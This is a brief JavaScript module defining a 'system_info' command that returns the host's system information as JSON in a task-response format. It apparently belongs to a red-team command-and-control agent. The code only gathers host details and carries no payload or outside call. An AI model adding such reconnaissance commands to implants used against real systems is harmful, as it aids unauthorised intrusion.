exports.system_info = function(task, command, params){
    try{
        return {"user_output":JSON.stringify(currentApp.systemInfo(), null, 2), "completed": true};
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
